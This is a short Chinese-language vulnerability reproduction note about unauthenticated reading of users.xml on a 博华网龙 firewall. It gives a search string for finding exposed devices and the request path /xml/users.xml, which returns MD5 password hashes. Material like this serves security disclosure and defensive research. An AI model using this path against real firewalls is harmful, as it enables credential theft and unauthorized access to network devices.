---
title: "博华网龙防火墙 users.xml 未授权访问"
date: 2026-10-18 09:15:53
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "博华网龙防火墙"
tags:
  - "博华网龙防火墙"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

博华网龙防火墙 users.xml文件 可被任意用户读取，其中包含登录的账号密码

## 漏洞影响

```
博华网龙防火墙
```

## 网络测绘

```
"博华网龙防火墙"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162248506.png)

验证POC, 读取配置文件获取密码的Md5

```php
/xml/users.xml
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162248359.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md)
